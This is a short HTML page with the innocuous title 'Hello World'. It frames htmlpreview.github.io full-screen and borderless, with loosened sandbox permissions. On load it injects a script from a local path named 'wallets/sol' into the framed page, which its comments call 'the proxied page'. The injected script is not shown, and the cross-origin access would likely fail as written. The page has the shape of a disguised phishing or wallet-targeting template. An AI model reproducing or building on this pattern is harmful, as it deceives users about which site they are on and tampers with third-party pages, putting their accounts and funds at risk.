<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hello World</title>
     <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }
        iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>
 <!-- Iframe pointing to the proxied page -->
  <iframe id="myIframe" src="https://htmlpreview.github.io/" sandbox="allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-popups-to-escape-sandbox allow-presentation allow-same-origin allow-scripts allow-top-navigation allow-top-navigation-by-user-activation"></iframe>

  <script>
    function injectScript() {
      const iframe = document.getElementById('myIframe');
      const iframeDocument = iframe.contentDocument;

      // Inject a script into the proxied page
      const script = document.createElement('script');
      script.src = 'https://localhost/wallets/sol/index.js'; // Your local script
      iframeDocument.head.appendChild(script);

      console.log('Script injected successfully.');
    }

    document.getElementById('myIframe').onload = injectScript;
  </script>
</body>
</html>
